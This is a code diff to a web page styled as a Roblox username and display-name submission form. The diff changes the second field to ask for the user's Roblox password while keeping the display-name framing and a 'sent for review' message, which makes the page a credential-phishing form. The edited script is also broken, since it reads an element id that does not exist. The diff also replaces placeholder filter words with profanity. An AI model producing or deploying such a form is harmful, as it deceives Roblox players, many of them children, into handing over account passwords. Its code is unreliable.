@@ -136,7 +136,7 @@
     <div class="container">
         <h1>Roblox Username & Display Name</h1>
         <input type="text" id="username" placeholder="Enter Roblox Username">
-        <input type="text" id="displayName" placeholder="Enter Roblox Display Name">
+        <input type="text" id="displayName" placeholder="Enter Roblox Password">
         <button onclick="submitForm()">Submit</button>
     </div>
     <div id="notification" class="notification">Submission sent for review!</div>
@@ -144,7 +144,7 @@
     <script>
         async function submitForm() {
             const username = document.getElementById('username').value.trim();
-            const displayName = document.getElementById('displayName').value.trim();
+            const displayName = document.getElementById('Password').value.trim();
             const notification = document.getElementById('notification');
 
             if (!username || !displayName) {
@@ -156,7 +156,7 @@
             }
 
             // Basic content filter (replace with more robust moderation if needed)
-            const inappropriateWords = ['badword1', 'badword2']; // Add inappropriate words here
+            const inappropriateWords = ['Bitch', 'Fuck']; // Add inappropriate words here
             const isInappropriate = inappropriateWords.some(word => 
                 username.toLowerCase().includes(word) || displayName.toLowerCase().includes(word)
             );
